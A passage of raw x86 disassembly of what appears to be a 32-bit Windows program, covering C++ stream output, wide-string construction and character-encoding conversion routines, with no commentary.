  406119:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40611d:	8b 41 04             	mov    0x4(%ecx),%eax
  406120:	8b 44 18 14          	mov    0x14(%eax,%ebx,1),%eax
  406124:	25 c0 01 00 00       	and    $0x1c0,%eax
  406129:	83 f8 40             	cmp    $0x40,%eax
  40612c:	74 27                	je     0x406155
  40612e:	66 90                	xchg   %ax,%ax
  406130:	85 ff                	test   %edi,%edi
  406132:	74 21                	je     0x406155
  406134:	8b 03                	mov    (%ebx),%eax
  406136:	8b 40 04             	mov    0x4(%eax),%eax
  406139:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  40613d:	8a 44 18 40          	mov    0x40(%eax,%ebx,1),%al
  406141:	50                   	push   %eax
  406142:	ff 15 c0 90 40 00    	call   *0x4090c0
  406148:	83 f8 ff             	cmp    $0xffffffff,%eax
  40614b:	75 05                	jne    0x406152
  40614d:	8d 70 05             	lea    0x5(%eax),%esi
  406150:	eb 21                	jmp    0x406173
  406152:	4f                   	dec    %edi
  406153:	eb db                	jmp    0x406130
  406155:	8b 03                	mov    (%ebx),%eax
  406157:	8b 40 04             	mov    0x4(%eax),%eax
  40615a:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  40615e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406161:	8a 40 08             	mov    0x8(%eax),%al
  406164:	50                   	push   %eax
  406165:	ff 15 c0 90 40 00    	call   *0x4090c0
  40616b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40616e:	75 06                	jne    0x406176
  406170:	83 ce 04             	or     $0x4,%esi
  406173:	89 75 ec             	mov    %esi,-0x14(%ebp)
  406176:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  406179:	8b 01                	mov    (%ecx),%eax
  40617b:	8d 51 08             	lea    0x8(%ecx),%edx
  40617e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406181:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  406184:	74 4e                	je     0x4061d4
  406186:	8d 51 08             	lea    0x8(%ecx),%edx
  406189:	8a 08                	mov    (%eax),%cl
  40618b:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40618e:	3a 0a                	cmp    (%edx),%cl
  406190:	0f 84 a1 00 00 00    	je     0x406237
  406196:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406199:	3a 48 09             	cmp    0x9(%eax),%cl
  40619c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40619f:	0f 84 92 00 00 00    	je     0x406237
  4061a5:	85 f6                	test   %esi,%esi
  4061a7:	0f 85 be 00 00 00    	jne    0x40626b
  4061ad:	8b 03                	mov    (%ebx),%eax
  4061af:	8b 40 04             	mov    0x4(%eax),%eax
  4061b2:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  4061b6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4061b9:	8a 00                	mov    (%eax),%al
  4061bb:	50                   	push   %eax
  4061bc:	ff 15 c0 90 40 00    	call   *0x4090c0
  4061c2:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4061c5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4061c8:	0f 85 9a 00 00 00    	jne    0x406268
  4061ce:	83 ce 04             	or     $0x4,%esi
  4061d1:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4061d4:	85 f6                	test   %esi,%esi
  4061d6:	75 48                	jne    0x406220
  4061d8:	8b 03                	mov    (%ebx),%eax
  4061da:	8b 40 04             	mov    0x4(%eax),%eax
  4061dd:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  4061e1:	8a 02                	mov    (%edx),%al
  4061e3:	50                   	push   %eax
  4061e4:	ff 15 c0 90 40 00    	call   *0x4090c0
  4061ea:	83 f8 ff             	cmp    $0xffffffff,%eax
  4061ed:	75 11                	jne    0x406200
  4061ef:	83 ce 04             	or     $0x4,%esi
  4061f2:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4061f5:	85 f6                	test   %esi,%esi
  4061f7:	75 27                	jne    0x406220
  4061f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  406200:	85 ff                	test   %edi,%edi
  406202:	74 1c                	je     0x406220
  406204:	8b 03                	mov    (%ebx),%eax
  406206:	8b 40 04             	mov    0x4(%eax),%eax
  406209:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  40620d:	8a 44 18 40          	mov    0x40(%eax,%ebx,1),%al
  406211:	50                   	push   %eax
  406212:	ff 15 c0 90 40 00    	call   *0x4090c0
  406218:	83 f8 ff             	cmp    $0xffffffff,%eax
  40621b:	75 57                	jne    0x406274
  40621d:	83 ce 04             	or     $0x4,%esi
  406220:	8b 03                	mov    (%ebx),%eax
  406222:	8b 40 04             	mov    0x4(%eax),%eax
  406225:	c7 44 18 20 00 00 00 	movl   $0x0,0x20(%eax,%ebx,1)
  40622c:	00 
  40622d:	c7 44 18 24 00 00 00 	movl   $0x0,0x24(%eax,%ebx,1)
  406234:	00 
  406235:	eb 60                	jmp    0x406297
  406237:	85 f6                	test   %esi,%esi
  406239:	75 30                	jne    0x40626b
  40623b:	8b 03                	mov    (%ebx),%eax
  40623d:	8b 40 04             	mov    0x4(%eax),%eax
  406240:	8b 4c 18 38          	mov    0x38(%eax,%ebx,1),%ecx
  406244:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406247:	8a 40 09             	mov    0x9(%eax),%al
  40624a:	50                   	push   %eax
  40624b:	ff 15 c0 90 40 00    	call   *0x4090c0
  406251:	83 f8 ff             	cmp    $0xffffffff,%eax
  406254:	0f 85 53 ff ff ff    	jne    0x4061ad
  40625a:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40625d:	83 ce 04             	or     $0x4,%esi
  406260:	89 75 ec             	mov    %esi,-0x14(%ebp)
  406263:	e9 6c ff ff ff       	jmp    0x4061d4
  406268:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40626b:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40626e:	40                   	inc    %eax
  40626f:	e9 0a ff ff ff       	jmp    0x40617e
  406274:	4f                   	dec    %edi
  406275:	eb 89                	jmp    0x406200
  406277:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40627a:	6a 01                	push   $0x1
  40627c:	6a 04                	push   $0x4
  40627e:	8b 02                	mov    (%edx),%eax
  406280:	8b 48 04             	mov    0x4(%eax),%ecx
  406283:	03 ca                	add    %edx,%ecx
  406285:	ff 15 ac 90 40 00    	call   *0x4090ac
  40628b:	b8 91 62 40 00       	mov    $0x406291,%eax
  406290:	c3                   	ret
  406291:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  406294:	8b 75 ec             	mov    -0x14(%ebp),%esi
  406297:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40629e:	8b 03                	mov    (%ebx),%eax
  4062a0:	6a 00                	push   $0x0
  4062a2:	56                   	push   %esi
  4062a3:	8b 48 04             	mov    0x4(%eax),%ecx
  4062a6:	03 cb                	add    %ebx,%ecx
  4062a8:	ff 15 ac 90 40 00    	call   *0x4090ac
  4062ae:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4062b5:	ff 15 04 91 40 00    	call   *0x409104
  4062bb:	8b 75 d0             	mov    -0x30(%ebp),%esi
  4062be:	85 c0                	test   %eax,%eax
  4062c0:	75 08                	jne    0x4062ca
  4062c2:	8b ce                	mov    %esi,%ecx
  4062c4:	ff 15 b4 90 40 00    	call   *0x4090b4
  4062ca:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  4062ce:	8b 06                	mov    (%esi),%eax
  4062d0:	8b 40 04             	mov    0x4(%eax),%eax
  4062d3:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  4062d7:	85 c9                	test   %ecx,%ecx
  4062d9:	74 05                	je     0x4062e0
  4062db:	8b 01                	mov    (%ecx),%eax
  4062dd:	ff 50 08             	call   *0x8(%eax)
  4062e0:	8b c3                	mov    %ebx,%eax
  4062e2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4062e5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4062ec:	59                   	pop    %ecx
  4062ed:	5f                   	pop    %edi
  4062ee:	5e                   	pop    %esi
  4062ef:	5b                   	pop    %ebx
  4062f0:	8b e5                	mov    %ebp,%esp
  4062f2:	5d                   	pop    %ebp
  4062f3:	c3                   	ret
  4062f4:	cc                   	int3
  4062f5:	cc                   	int3
  4062f6:	cc                   	int3
  4062f7:	cc                   	int3
  4062f8:	cc                   	int3
  4062f9:	cc                   	int3
  4062fa:	cc                   	int3
  4062fb:	cc                   	int3
  4062fc:	cc                   	int3
  4062fd:	cc                   	int3
  4062fe:	cc                   	int3
  4062ff:	cc                   	int3
  406300:	55                   	push   %ebp
  406301:	8b ec                	mov    %esp,%ebp
  406303:	83 e4 f8             	and    $0xfffffff8,%esp
  406306:	83 ec 0c             	sub    $0xc,%esp
  406309:	56                   	push   %esi
  40630a:	6a 01                	push   $0x1
  40630c:	68 f0 93 40 00       	push   $0x4093f0
  406311:	ff 75 08             	push   0x8(%ebp)
  406314:	8b f1                	mov    %ecx,%esi
  406316:	89 74 24 14          	mov    %esi,0x14(%esp)
  40631a:	e8 b1 00 00 00       	call   0x4063d0
  40631f:	83 c4 0c             	add    $0xc,%esp
  406322:	8b c6                	mov    %esi,%eax
  406324:	5e                   	pop    %esi
  406325:	8b e5                	mov    %ebp,%esp
  406327:	5d                   	pop    %ebp
  406328:	c3                   	ret
  406329:	cc                   	int3
  40632a:	cc                   	int3
  40632b:	cc                   	int3
  40632c:	cc                   	int3
  40632d:	cc                   	int3
  40632e:	cc                   	int3
  40632f:	cc                   	int3
  406330:	85 c9                	test   %ecx,%ecx
  406332:	74 07                	je     0x40633b
  406334:	8b 01                	mov    (%ecx),%eax
  406336:	6a 01                	push   $0x1
  406338:	ff 50 08             	call   *0x8(%eax)
  40633b:	c3                   	ret
  40633c:	cc                   	int3
  40633d:	cc                   	int3
  40633e:	cc                   	int3
  40633f:	cc                   	int3
  406340:	56                   	push   %esi
  406341:	8b f1                	mov    %ecx,%esi
  406343:	ff 76 48             	push   0x48(%esi)
  406346:	e8 01 04 00 00       	call   0x40674c
  40634b:	8b 4e 44             	mov    0x44(%esi),%ecx
  40634e:	83 f9 08             	cmp    $0x8,%ecx
  406351:	72 2e                	jb     0x406381
  406353:	8b 46 30             	mov    0x30(%esi),%eax
  406356:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  40635d:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  406363:	72 12                	jb     0x406377
  406365:	8b 50 fc             	mov    -0x4(%eax),%edx
  406368:	83 c1 23             	add    $0x23,%ecx
  40636b:	2b c2                	sub    %edx,%eax
  40636d:	83 c0 fc             	add    $0xfffffffc,%eax
  406370:	83 f8 1f             	cmp    $0x1f,%eax
  406373:	77 1e                	ja     0x406393
  406375:	8b c2                	mov    %edx,%eax
  406377:	51                   	push   %ecx
  406378:	50                   	push   %eax
  406379:	e8 3e 07 00 00       	call   0x406abc
  40637e:	83 c4 08             	add    $0x8,%esp
  406381:	33 c0                	xor    %eax,%eax
  406383:	66 89 46 30          	mov    %ax,0x30(%esi)
  406387:	89 46 40             	mov    %eax,0x40(%esi)
  40638a:	c7 46 44 07 00 00 00 	movl   $0x7,0x44(%esi)
  406391:	5e                   	pop    %esi
  406392:	c3                   	ret
  406393:	ff 15 80 91 40 00    	call   *0x409180
  406399:	cc                   	int3
  40639a:	cc                   	int3
  40639b:	cc                   	int3
  40639c:	cc                   	int3
  40639d:	cc                   	int3
  40639e:	cc                   	int3
  40639f:	cc                   	int3
  4063a0:	55                   	push   %ebp
  4063a1:	8b ec                	mov    %esp,%ebp
  4063a3:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4063a7:	56                   	push   %esi
  4063a8:	8b f1                	mov    %ecx,%esi
  4063aa:	c7 06 c8 95 40 00    	movl   $0x4095c8,(%esi)
  4063b0:	74 0b                	je     0x4063bd
  4063b2:	6a 50                	push   $0x50
  4063b4:	56                   	push   %esi
  4063b5:	e8 02 07 00 00       	call   0x406abc
  4063ba:	83 c4 08             	add    $0x8,%esp
  4063bd:	8b c6                	mov    %esi,%eax
  4063bf:	5e                   	pop    %esi
  4063c0:	5d                   	pop    %ebp
  4063c1:	c2 04 00             	ret    $0x4
  4063c4:	cc                   	int3
  4063c5:	cc                   	int3
  4063c6:	cc                   	int3
  4063c7:	cc                   	int3
  4063c8:	cc                   	int3
  4063c9:	cc                   	int3
  4063ca:	cc                   	int3
  4063cb:	cc                   	int3
  4063cc:	cc                   	int3
  4063cd:	cc                   	int3
  4063ce:	cc                   	int3
  4063cf:	cc                   	int3
  4063d0:	55                   	push   %ebp
  4063d1:	8b ec                	mov    %esp,%ebp
  4063d3:	6a ff                	push   $0xffffffff
  4063d5:	68 0e 81 40 00       	push   $0x40810e
  4063da:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4063e0:	50                   	push   %eax
  4063e1:	83 ec 28             	sub    $0x28,%esp
  4063e4:	53                   	push   %ebx
  4063e5:	56                   	push   %esi
  4063e6:	57                   	push   %edi
  4063e7:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4063ec:	33 c5                	xor    %ebp,%eax
  4063ee:	50                   	push   %eax
  4063ef:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4063f2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4063f8:	8b f1                	mov    %ecx,%esi
  4063fa:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4063fd:	89 75 d0             	mov    %esi,-0x30(%ebp)
  406400:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  406407:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40640a:	8b 7d 10             	mov    0x10(%ebp),%edi
  40640d:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406410:	89 7d d8             	mov    %edi,-0x28(%ebp)
  406413:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406416:	e8 9c 01 00 00       	call   0x4065b7
  40641b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40641e:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  406424:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40642b:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  406432:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406439:	33 c9                	xor    %ecx,%ecx
  40643b:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  406442:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  406449:	88 4d fc             	mov    %cl,-0x4(%ebp)
  40644c:	66 89 0e             	mov    %cx,(%esi)
  40644f:	c7 45 e4 02 00 00 00 	movl   $0x2,-0x1c(%ebp)
  406456:	85 ff                	test   %edi,%edi
  406458:	0f 84 b6 00 00 00    	je     0x406514
  40645e:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  406464:	0f 87 be 00 00 00    	ja     0x406528
  40646a:	51                   	push   %ecx
  40646b:	51                   	push   %ecx
  40646c:	57                   	push   %edi
  40646d:	53                   	push   %ebx
  40646e:	50                   	push   %eax
  40646f:	e8 61 01 00 00       	call   0x4065d5
  406474:	8b d8                	mov    %eax,%ebx
  406476:	85 d2                	test   %edx,%edx
  406478:	0f 85 af 00 00 00    	jne    0x40652d
  40647e:	8b 4e 10             	mov    0x10(%esi),%ecx
  406481:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406484:	3b d9                	cmp    %ecx,%ebx
  406486:	77 15                	ja     0x40649d
  406488:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40648c:	8b c6                	mov    %esi,%eax
  40648e:	72 02                	jb     0x406492
  406490:	8b 06                	mov    (%esi),%eax
  406492:	33 c9                	xor    %ecx,%ecx
  406494:	89 5e 10             	mov    %ebx,0x10(%esi)
  406497:	66 89 0c 58          	mov    %cx,(%eax,%ebx,2)
  40649b:	eb 5b                	jmp    0x4064f8
  40649d:	8b 46 14             	mov    0x14(%esi),%eax
  4064a0:	8b d3                	mov    %ebx,%edx
  4064a2:	2b d1                	sub    %ecx,%edx
  4064a4:	2b c1                	sub    %ecx,%eax
  4064a6:	3b d0                	cmp    %eax,%edx
  4064a8:	77 41                	ja     0x4064eb
  4064aa:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4064ae:	8b c6                	mov    %esi,%eax
  4064b0:	89 5e 10             	mov    %ebx,0x10(%esi)
  4064b3:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4064b6:	72 05                	jb     0x4064bd
  4064b8:	8b 06                	mov    (%esi),%eax
  4064ba:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4064bd:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4064c0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4064c3:	85 d2                	test   %edx,%edx
  4064c5:	74 16                	je     0x4064dd
  4064c7:	8b 7d e0             	mov    -0x20(%ebp),%edi
  4064ca:	33 c0                	xor    %eax,%eax
  4064cc:	8b ca                	mov    %edx,%ecx
  4064ce:	d1 e9                	shr    $1,%ecx
  4064d0:	f3 ab                	rep stos %eax,%es:(%edi)
  4064d2:	13 c9                	adc    %ecx,%ecx
  4064d4:	66 f3 ab             	rep stos %ax,%es:(%edi)
  4064d7:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4064da:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4064dd:	8d 04 11             	lea    (%ecx,%edx,1),%eax
  4064e0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4064e3:	33 d2                	xor    %edx,%edx
  4064e5:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  4064e9:	eb 0d                	jmp    0x4064f8
  4064eb:	51                   	push   %ecx
  4064ec:	52                   	push   %edx
  4064ed:	ff 75 d0             	push   -0x30(%ebp)
  4064f0:	8b ce                	mov    %esi,%ecx
  4064f2:	52                   	push   %edx
  4064f3:	e8 18 f1 ff ff       	call   0x405610
  4064f8:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4064fc:	8b c6                	mov    %esi,%eax
  4064fe:	72 02                	jb     0x406502
  406500:	8b 06                	mov    (%esi),%eax
  406502:	53                   	push   %ebx
  406503:	50                   	push   %eax
  406504:	57                   	push   %edi
  406505:	ff 75 d4             	push   -0x2c(%ebp)
  406508:	ff 75 ec             	push   -0x14(%ebp)
  40650b:	e8 c5 00 00 00       	call   0x4065d5
  406510:	85 d2                	test   %edx,%edx
  406512:	75 20                	jne    0x406534
  406514:	8b c6                	mov    %esi,%eax
  406516:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406519:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406520:	59                   	pop    %ecx
  406521:	5f                   	pop    %edi
  406522:	5e                   	pop    %esi
  406523:	5b                   	pop    %ebx
  406524:	8b e5                	mov    %ebp,%esp
  406526:	5d                   	pop    %ebp
  406527:	c3                   	ret
  406528:	e8 83 b0 ff ff       	call   0x4015b0
  40652d:	8b ca                	mov    %edx,%ecx
  40652f:	e8 3c b4 ff ff       	call   0x401970
  406534:	8b ca                	mov    %edx,%ecx
  406536:	e8 35 b4 ff ff       	call   0x401970
  40653b:	cc                   	int3
  40653c:	2b 49 fc             	sub    -0x4(%ecx),%ecx
  40653f:	e9 bc df ff ff       	jmp    0x404500
  406544:	55                   	push   %ebp
  406545:	8b ec                	mov    %esp,%ebp
  406547:	8b 45 0c             	mov    0xc(%ebp),%eax
  40654a:	85 c0                	test   %eax,%eax
  40654c:	74 16                	je     0x406564
  40654e:	8b 55 08             	mov    0x8(%ebp),%edx
  406551:	0f b6 4c 02 ff       	movzbl -0x1(%edx,%eax,1),%ecx
  406556:	80 b9 50 92 40 00 00 	cmpb   $0x0,0x409250(%ecx)
  40655d:	74 05                	je     0x406564
  40655f:	83 e8 01             	sub    $0x1,%eax
  406562:	75 ed                	jne    0x406551
  406564:	5d                   	pop    %ebp
  406565:	c2 08 00             	ret    $0x8
  406568:	55                   	push   %ebp
  406569:	8b ec                	mov    %esp,%ebp
  40656b:	56                   	push   %esi
  40656c:	8b 75 0c             	mov    0xc(%ebp),%esi
  40656f:	33 c0                	xor    %eax,%eax
  406571:	50                   	push   %eax
  406572:	50                   	push   %eax
  406573:	56                   	push   %esi
  406574:	50                   	push   %eax
  406575:	ff 75 08             	push   0x8(%ebp)
  406578:	50                   	push   %eax
  406579:	68 00 13 00 00       	push   $0x1300
  40657e:	ff 15 4c 90 40 00    	call   *0x40904c
  406584:	50                   	push   %eax
  406585:	ff 36                	push   (%esi)
  406587:	e8 b8 ff ff ff       	call   0x406544
  40658c:	5e                   	pop    %esi
  40658d:	5d                   	pop    %ebp
  40658e:	c2 08 00             	ret    $0x8
  406591:	ff 25 48 90 40 00    	jmp    *0x409048
  406597:	55                   	push   %ebp
  406598:	8b ec                	mov    %esp,%ebp
  40659a:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40659e:	74 13                	je     0x4065b3
  4065a0:	ff 75 08             	push   0x8(%ebp)
  4065a3:	ff 15 10 90 40 00    	call   *0x409010
  4065a9:	85 c0                	test   %eax,%eax
  4065ab:	75 06                	jne    0x4065b3
  4065ad:	ff 15 84 91 40 00    	call   *0x409184
  4065b3:	5d                   	pop    %ebp
  4065b4:	c2 04 00             	ret    $0x4
  4065b7:	ff 15 6c 91 40 00    	call   *0x40916c
  4065bd:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  4065c2:	3b c1                	cmp    %ecx,%eax
  4065c4:	75 03                	jne    0x4065c9
  4065c6:	8b c1                	mov    %ecx,%eax
  4065c8:	c3                   	ret
  4065c9:	ff 15 1c 90 40 00    	call   *0x40901c
  4065cf:	f7 d8                	neg    %eax
  4065d1:	1b c0                	sbb    %eax,%eax
  4065d3:	40                   	inc    %eax
  4065d4:	c3                   	ret
  4065d5:	55                   	push   %ebp
  4065d6:	8b ec                	mov    %esp,%ebp
  4065d8:	56                   	push   %esi
  4065d9:	ff 75 18             	push   0x18(%ebp)
  4065dc:	ff 75 14             	push   0x14(%ebp)
  4065df:	ff 75 10             	push   0x10(%ebp)
  4065e2:	ff 75 0c             	push   0xc(%ebp)
  4065e5:	6a 08                	push   $0x8
  4065e7:	ff 75 08             	push   0x8(%ebp)
  4065ea:	ff 15 04 90 40 00    	call   *0x409004
  4065f0:	8b f0                	mov    %eax,%esi
  4065f2:	85 f6                	test   %esi,%esi
  4065f4:	75 0a                	jne    0x406600
  4065f6:	ff 15 60 90 40 00    	call   *0x409060
  4065fc:	8b d0                	mov    %eax,%edx
  4065fe:	eb 02                	jmp    0x406602
  406600:	33 d2                	xor    %edx,%edx
  406602:	8b c6                	mov    %esi,%eax
  406604:	5e                   	pop    %esi
  406605:	5d                   	pop    %ebp
  406606:	c2 14 00             	ret    $0x14
  406609:	55                   	push   %ebp
  40660a:	8b ec                	mov    %esp,%ebp
  40660c:	51                   	push   %ecx
  40660d:	53                   	push   %ebx
  40660e:	56                   	push   %esi
  40660f:	57                   	push   %edi
  406610:	8b 7d 08             	mov    0x8(%ebp),%edi
  406613:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
  406619:	74 3a                	je     0x406655
  40661b:	81 ff 98 d6 00 00    	cmp    $0xd698,%edi
  406621:	74 32                	je     0x406655
  406623:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406626:	33 f6                	xor    %esi,%esi
  406628:	50                   	push   %eax
  406629:	56                   	push   %esi
  40662a:	ff 75 18             	push   0x18(%ebp)
  40662d:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406630:	ff 75 14             	push   0x14(%ebp)
  406633:	ff 75 10             	push   0x10(%ebp)
  406636:	ff 75 0c             	push   0xc(%ebp)
  406639:	68 00 04 00 00       	push   $0x400
  40663e:	57                   	push   %edi
  40663f:	ff 15 08 90 40 00    	call   *0x409008
  406645:	8b d8                	mov    %eax,%ebx
  406647:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  40664a:	74 27                	je     0x406673
  40664c:	ba 59 04 00 00       	mov    $0x459,%edx
  406651:	8b c6                	mov    %esi,%eax
  406653:	eb 60                	jmp    0x4066b5
  406655:	33 f6                	xor    %esi,%esi
  406657:	56                   	push   %esi
  406658:	56                   	push   %esi
  406659:	ff 75 18             	push   0x18(%ebp)
  40665c:	ff 75 14             	push   0x14(%ebp)
  40665f:	ff 75 10             	push   0x10(%ebp)
  406662:	ff 75 0c             	push   0xc(%ebp)
  406665:	68 80 00 00 00       	push   $0x80
  40666a:	57                   	push   %edi
  40666b:	ff 15 08 90 40 00    	call   *0x409008
  406671:	8b d8                	mov    %eax,%ebx
  406673:	85 db                	test   %ebx,%ebx
  406675:	75 0a                	jne    0x406681
  406677:	ff 15 60 90 40 00    	call   *0x409060
  40667d:	8b d0                	mov    %eax,%edx
  40667f:	eb 02                	jmp    0x406683
  406681:	8b d6                	mov    %esi,%edx
  406683:	81 fa ec 03 00 00    	cmp    $0x3ec,%edx
  406689:	75 28                	jne    0x4066b3
  40668b:	56                   	push   %esi
  40668c:	56                   	push   %esi
  40668d:	ff 75 18             	push   0x18(%ebp)
  406690:	ff 75 14             	push   0x14(%ebp)
  406693:	ff 75 10             	push   0x10(%ebp)
  406696:	ff 75 0c             	push   0xc(%ebp)
  406699:	56                   	push   %esi
  40669a:	57                   	push   %edi
  40669b:	ff 15 08 90 40 00    	call   *0x409008
  4066a1:	8b d8                	mov    %eax,%ebx
  4066a3:	85 db                	test   %ebx,%ebx
  4066a5:	75 0a                	jne    0x4066b1
  4066a7:	ff 15 60 90 40 00    	call   *0x409060
  4066ad:	8b d0                	mov    %eax,%edx
  4066af:	eb 02                	jmp    0x4066b3
  4066b1:	8b d6                	mov    %esi,%edx
  4066b3:	8b c3                	mov    %ebx,%eax
  4066b5:	5f                   	pop    %edi
  4066b6:	5e                   	pop    %esi
  4066b7:	5b                   	pop    %ebx
  4066b8:	c9                   	leave
  4066b9:	c2 14 00             	ret    $0x14
  4066bc:	55                   	push   %ebp
  4066bd:	8b ec                	mov    %esp,%ebp
  4066bf:	56                   	push   %esi
  4066c0:	57                   	push   %edi
  4066c1:	33 ff                	xor    %edi,%edi
  4066c3:	57                   	push   %edi
  4066c4:	57                   	push   %edi
  4066c5:	ff 75 18             	push   0x18(%ebp)
  4066c8:	ff 75 14             	push   0x14(%ebp)
  4066cb:	ff 75 10             	push   0x10(%ebp)
  4066ce:	ff 75 0c             	push   0xc(%ebp)
  4066d1:	68 00 04 00 00       	push   $0x400
  4066d6:	ff 75 08             	push   0x8(%ebp)
  4066d9:	ff 15 08 90 40 00    	call   *0x409008
  4066df:	8b f0                	mov    %eax,%esi
  4066e1:	85 f6                	test   %esi,%esi
  4066e3:	75 0a                	jne    0x4066ef
  4066e5:	ff 15 60 90 40 00    	call   *0x409060
  4066eb:	8b d0                	mov    %eax,%edx
  4066ed:	eb 02                	jmp    0x4066f1
  4066ef:	8b d7                	mov    %edi,%edx
  4066f1:	81 fa ec 03 00 00    	cmp    $0x3ec,%edx
  4066f7:	75 2a                	jne    0x406723
  4066f9:	57                   	push   %edi
  4066fa:	57                   	push   %edi
  4066fb:	ff 75 18             	push   0x18(%ebp)
  4066fe:	ff 75 14             	push   0x14(%ebp)
  406701:	ff 75 10             	push   0x10(%ebp)
  406704:	ff 75 0c             	push   0xc(%ebp)
  406707:	57                   	push   %edi
  406708:	ff 75 08             	push   0x8(%ebp)
  40670b:	ff 15 08 90 40 00    	call   *0x409008
  406711:	8b f0                	mov    %eax,%esi
  406713:	85 f6                	test   %esi,%esi
  406715:	75 0a                	jne    0x406721
  406717:	ff 15 60 90 40 00    	call   *0x409060
  40671d:	8b d0                	mov    %eax,%edx
  40671f:	eb 02                	jmp    0x406723
  406721:	8b d7                	mov    %edi,%edx
  406723:	5f                   	pop    %edi
  406724:	8b c6                	mov    %esi,%eax
  406726:	5e                   	pop    %esi
  406727:	5d                   	pop    %ebp
  406728:	c2 14 00             	ret    $0x14
  40672b:	55                   	push   %ebp
  40672c:	8b ec                	mov    %esp,%ebp
  40672e:	ff 75 0c             	push   0xc(%ebp)
  406731:	ff 75 08             	push   0x8(%ebp)
  406734:	ff 15 5c 90 40 00    	call   *0x40905c
  40673a:	85 c0                	test   %eax,%eax
  40673c:	74 04                	je     0x406742
  40673e:	33 c0                	xor    %eax,%eax
  406740:	eb 06                	jmp    0x406748
  406742:	ff 15 60 90 40 00    	call   *0x409060
  406748:	5d                   	pop    %ebp
  406749:	c2 08 00             	ret    $0x8
  40674c:	55                   	push   %ebp
  40674d:	8b ec                	mov    %esp,%ebp
  40674f:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  406753:	74 13                	je     0x406768
  406755:	ff 75 08             	push   0x8(%ebp)
  406758:	ff 15 54 90 40 00    	call   *0x409054
  40675e:	85 c0                	test   %eax,%eax
  406760:	75 06                	jne    0x406768
  406762:	ff 15 84 91 40 00    	call   *0x409184
  406768:	5d                   	pop    %ebp
  406769:	c2 04 00             	ret    $0x4
  40676c:	55                   	push   %ebp
  40676d:	8b ec                	mov    %esp,%ebp
  40676f:	56                   	push   %esi
  406770:	8b 75 0c             	mov    0xc(%ebp),%esi
  406773:	57                   	push   %edi
  406774:	ff 36                	push   (%esi)
  406776:	e8 d1 ff ff ff       	call   0x40674c
  40677b:	33 ff                	xor    %edi,%edi
  40677d:	57                   	push   %edi
  40677e:	57                   	push   %edi
  40677f:	57                   	push   %edi
  406780:	ff 75 10             	push   0x10(%ebp)
  406783:	6a 01                	push   $0x1
